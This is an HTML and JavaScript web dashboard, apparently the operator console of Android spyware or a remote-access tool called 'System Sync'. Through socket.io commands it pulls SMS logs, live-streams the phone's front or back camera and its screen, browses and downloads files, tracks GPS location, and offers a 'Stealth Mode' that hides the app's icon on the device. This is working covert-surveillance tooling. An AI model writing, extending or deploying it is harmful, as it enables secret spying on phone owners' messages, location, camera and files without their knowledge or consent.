<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Master Dashboard - System Sync</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --sidebar: #2c3e50; --teal: #1abc9c; --blue: #3498db; --red: #e74c3c; --win-hover: #e5f3ff; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; background: #f4f7f6; overflow: hidden; }
        
        .sidebar { width: 250px; background: var(--sidebar); color: white; display: flex; flex-direction: column; }
        .sidebar-header { padding: 20px; background: #1a252f; font-weight: bold; font-size: 1.2rem; }
        .nav-item { padding: 15px 25px; display: flex; align-items: center; color: #bdc3c7; cursor: pointer; transition: 0.3s; }
        .nav-item:hover, .nav-item.active { background: #3e5871; color: white; border-left: 5px solid var(--teal); }
        .nav-item i { margin-right: 15px; width: 20px; text-align: center; }

        .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .content { flex: 1; padding: 25px; overflow-y: auto; }

        /* Status Tiles */
        .status-row { display: flex; gap: 20px; margin-bottom: 30px; }
        .tile { background: white; flex: 1; border-radius: 8px; display: flex; box-shadow: 0 2px 5px rgba(0,0,0,0.1); overflow: hidden; }
        .tile-icon { width: 70px; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: #fff; }
        .tile-body { padding: 15px; flex: 1; }
        .tile-body label { display: block; font-size: 0.75rem; font-weight: bold; color: #7f8c8d; text-transform: uppercase; }
        .tile-body span { font-size: 1.1rem; font-weight: 500; }

        /* Windows Explorer Grid */
        .explorer-container { background: white; border: 1px solid #ddd; height: 80%; border-radius: 8px; display: flex; flex-direction: column; }
        .explorer-toolbar { padding: 12px; background: #f8f9fa; border-bottom: 1px solid #ddd; display: flex; gap: 10px; }
        .explorer-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; }
        .file-item { text-align: center; padding: 15px; cursor: pointer; border-radius: 5px; border: 1px solid transparent; }
        .file-item:hover { background: var(--win-hover); border: 1px solid #cce8ff; }
        .file-item i { font-size: 3rem; display: block; margin-bottom: 10px; }
        .icon-folder { color: #ffca28; } .icon-file { color: #78909c; }

        /* Floating 30 FPS Live Box */
        .video-overlay {
            display: none; position: fixed; bottom: 30px; right: 30px;
            width: 450px; background: #000; border-radius: 12px;
            box-shadow: 0 15px 50px rgba(0,0,0,0.7); z-index: 9999; border: 1px solid #444;
        }
        .video-header { padding: 12px 18px; background: #222; color: #fff; display: flex; justify-content: space-between; border-radius: 12px 12px 0 0; }
        .video-body img { width: 100%; height: auto; display: block; border-bottom: 1px solid #333; }
        .video-footer { padding: 15px; text-align: center; background: #222; border-radius: 0 0 12px 12px; }
        
        .btn-main { width: 100%; max-width: 300px; padding: 12px; background: var(--red); color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin: 20px auto; display: block; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">System Sync</div>
        <div class="nav-item active" onclick="showTab('dashboard')"><i class="fa fa-home"></i> Dashboard</div>
        <div class="nav-item" onclick="sendCmd('get-sms')"><i class="fa fa-envelope"></i> SMS Logs</div>
        <div class="nav-item" onclick="showTab('live')"><i class="fa fa-video"></i> Live Viewing</div>
        <div class="nav-item" onclick="showTab('explorer')"><i class="fa fa-folder-open"></i> File Explorer</div>
        <div class="nav-item" onclick="sendCmd('hide-icon')" style="color:#f39c12; margin-top: auto;"><i class="fa fa-eye-slash"></i> Stealth Mode</div>
    </div>

    <div class="main">
        <div class="content">
            <div class="status-row">
                <div class="tile"><div class="tile-icon" style="background:var(--teal)"><i class="fa fa-link"></i></div><div class="tile-body"><label>Connection</label><span>Online</span></div></div>
                <div class="tile"><div class="tile-icon" style="background:var(--red)"><i class="fa fa-battery-three-quarters"></i></div><div class="tile-body" style="background:var(--red); color:white"><label style="color:white">Battery</label><span id="stat-batt">-- %</span></div></div>
                <div class="tile" style="flex:2"><div class="tile-icon" style="background:var(--blue)"><i class="fa fa-map-pin"></i></div><div class="tile-body" style="background:var(--blue); color:white"><label style="color:white">Device GPS</label><span id="stat-gps">Waiting for signal...</span></div></div>
            </div>

            <div id="tab-live" style="display:none" class="live-panel">
                <h3 style="text-align:center">Select Streaming Source</h3>
                <div style="display:flex; justify-content:center; gap:20px; margin:30px 0;">
                    <div id="m-video" class="nav-item" style="color:#333; border:1px solid #ddd; border-radius:8px" onclick="setMode('video')"><i class="fa fa-camera"></i> CAMERA</div>
                    <div id="m-screen" class="nav-item" style="color:#333; border:1px solid #ddd; border-radius:8px" onclick="setMode('screen')"><i class="fa fa-desktop"></i> SCREEN</div>
                </div>
                <div id="cam-opts" style="text-align:center">
                    <select id="cam-sel" style="padding:10px; width:200px"><option value="0">Back Cam</option><option value="1">Front Cam</option></select>
                </div>
                <button class="btn-main" onclick="startStreaming()">START LIVE FEED</button>
            </div>

            <div id="tab-explorer" style="display:none; height:100%">
                <div class="explorer-container">
                    <div class="explorer-toolbar">
                        <button onclick="sendCmd('get-files')" style="padding:5px 15px; cursor:pointer"><i class="fa fa-sync"></i> Refresh Files</button>
                        <span id="current-path" style="margin-left:20px; font-family:monospace; color:#666">/storage/emulated/0</span>
                    </div>
                    <div class="explorer-grid" id="file-grid"></div>
                </div>
            </div>
        </div>
    </div>

    <div id="video-overlay" class="video-overlay">
        <div class="video-header"><span id="stream-type">LIVE VIEW</span><i class="fa fa-times" onclick="stopStreaming()" style="cursor:pointer"></i></div>
        <div class="video-body"><img id="live-img" src=""></div>
        <div class="video-footer"><button onclick="stopStreaming()" style="background:var(--red); color:white; border:none; padding:8px 20px; border-radius:4px; cursor:pointer">STOP STREAM</button></div>
    </div>

    <script>
        const socket = io();
        let curMode = 'video';

        function sendCmd(c) { socket.emit('phone-execute', c); }
        function showTab(t) {
            ['dashboard', 'live', 'explorer'].forEach(id => {
                const el = document.getElementById('tab-'+id);
                if(el) el.style.display = (id===t?'block':'none');
            });
        }

        function setMode(m) {
            curMode = m;
            document.getElementById('cam-opts').style.visibility = (m==='video'?'visible':'hidden');
            document.getElementById('stream-type').innerText = m.toUpperCase() + " STREAM";
        }

        function startStreaming() {
            let cmd = curMode === 'screen' ? "stream:0:screen" : `stream:${document.getElementById('cam-sel').value}:video`;
            sendCmd(cmd);
            document.getElementById('video-overlay').style.display = 'block';
        }

        function stopStreaming() {
            sendCmd('stop-stream');
            document.getElementById('video-overlay').style.display = 'none';
            document.getElementById('live-img').src = "";
        }

        socket.on('data-stream', (base64) => { document.getElementById('live-img').src = "data:image/jpeg;base64," + base64; });
        socket.on('battery-update', (v) => { document.getElementById('stat-batt').innerText = v + " %"; });
        socket.on('location-update', (d) => { document.getElementById('stat-gps').innerText = d.lat + ", " + d.lng; });

        socket.on('file-data', (data) => {
            const files = JSON.parse(data);
            const grid = document.getElementById('file-grid');
            grid.innerHTML = files.map(f => `
                <div class="file-item" onclick="${f.d ? '' : `sendCmd('download:${f.n}')`}">
                    <i class="fa ${f.d ? 'fa-folder icon-folder' : 'fa-file icon-file'}"></i>
                    <span>${f.n}</span>
                </div>
            `).join('');
        });

        socket.on('file-download-ready', (file) => {
            const link = document.createElement('a');
            link.href = "data:application/octet-stream;base64," + file.data;
            link.download = file.name;
            link.click();
        });
    </script>
</body>
</html>
